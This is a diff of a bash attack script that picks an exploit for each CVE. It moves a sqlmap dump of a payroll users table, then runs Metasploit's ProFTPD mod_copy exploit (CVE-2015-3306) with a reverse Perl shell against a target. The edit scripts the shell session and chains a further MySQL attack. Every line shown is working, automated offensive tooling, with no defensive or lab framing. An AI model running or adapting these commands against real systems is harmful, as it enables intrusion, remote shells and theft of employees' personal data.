@@ -10,8 +10,8 @@ then
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
 elif [ $ATTACK == "CVE-2015-3306" ]
 then
-	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; exit; " 
-	# in command shell run locate payroll_app. >> results.txt and then download results.txt \results.txt and then rm results.txt
+	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; sessions -i 1 -c ./command_shell.sh; exit -y; " 
+	# in command shell run command background and then enter y
 	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
 	rm results.txt
 	./attack-script.sh $TARGET mysql $SERVER 
